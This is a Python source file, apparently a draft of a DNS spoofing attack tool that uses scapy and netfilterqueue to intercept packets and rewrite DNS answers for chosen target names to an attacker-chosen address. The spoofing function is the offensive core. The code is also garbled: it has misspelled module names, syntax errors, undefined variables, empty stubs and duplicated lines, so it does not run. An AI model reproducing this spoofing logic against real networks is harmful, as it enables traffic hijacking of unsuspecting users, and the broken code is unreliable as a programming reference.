#
from pandas import DataFrame, MultiIndex 
import threading
import netfilterqueqe
import sys 
import logging
import scapy.all as cap
import socketserver as ss
import asyncio as sync 
import argparse
import string


logging.basicConfig(
    level=logging.DEBUG,
    format='(%(Appname)s %(threadName)-10s) %(message)s',
    filename="tacticalapp.log"
);

e = threading.Event();


q = netfilterqueqe.NetfilterQueqe()

localaddress = ()

class Address():
    def __init__(self, address):
        self.targets = MultiIndex.f


def user_input_target(self, *args):
   destination = self.destination
    if args.get == ['target*']:
        for i in args:
            destination.append(args.get['target']) 
        return destination
    else:
        return 0 
    ...

def user_input_origin(self, *args):
    origin = self.origin
    if args.get == ['origin*']: 
        

    ...

target_by_user = user_input_target
origin_by_user = user_input_origin
parser = argparse.ArgumentParser(
    description=' Enter the target and origin of the attack',
)

def scan_prompt_data(self) -> :
    print('set arguemnets: ', sys.argv)
    if self.prompt_data is not None: 
        sys.stdout.write()



def discover_host(*args):
    while args.get == ['target*'] 
        cap.conf.
        ...

def establish_link_with_target(target):
    ...


 def spoofing_process(packet):
    packet = cap.IP(packet.get_payload())
    while packet.haslayer(cap.DNSRR):
        qname = packet[cap.DNSQR].qname 
        for i in target_by_user:
            if target_by_user in qname: 
                payload = cap.DNSRR(rrname=qname, rdata=origin_by_user)
                packet[cap.DNS].an = payload 
                packet[cap.DNS].ancount = 1
                del packet[cap.IP].len
                del packet[cap.IP].chksum
                del packet[cap.UDP].chksum
                del packet[cap.UDP].chksum
                del packet[cap.UDP].len 

            packet.set_payload(str(cap_packet))
    packet.accept()

e= threading.Event()

scan_input_thread = threading.Thread(
    name=' scanning user input %()s'
    target = scan_prompt_data,
    args=()
)

process_spoof_thread = threading.Thread(
    name=' packet processing %()s'
    target= process,
    args=(e,),
)

def main():
  parser.add_arguemnt('end', action=, default=false);
  parser.add_arguemnt('spoof',action=,default=false);
  queue = q.bind(0, process)

if __name__ is __main__:
    main()